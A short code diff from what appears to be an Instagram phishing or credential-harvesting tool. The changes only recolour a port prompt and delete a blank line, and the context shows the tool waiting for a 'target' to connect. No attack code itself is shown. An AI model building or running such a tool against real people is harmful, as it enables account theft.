@@ -127,7 +127,7 @@ def instagram():
 
 #====================================================================================================
     try:
-        port = int(input(Fore.MAGENTA + f"\nWhich Port Want To Open (Default 80) {Fore.GREEN}⮞ " + Fore.RESET))
+        port = int(input(Fore.MAGENTA + f"\nWhich Port Want To Open {Fore.BLUE}({Fore.GREEN}Default 80{Fore.BLUE}) {Fore.GREEN}⮞ " + Fore.RESET))
         if port > 65535:
             exit(f"""{Fore.YELLOW}│
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} Port must be less than {Fore.GREEN}65536""" + Fore.RESET)
@@ -156,7 +156,6 @@ def instagram():
     linecache.clearcache()
     print("")
     Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n" + Fore.RESET)
-
 #Write info====================================================================================================
     try:
         while True:
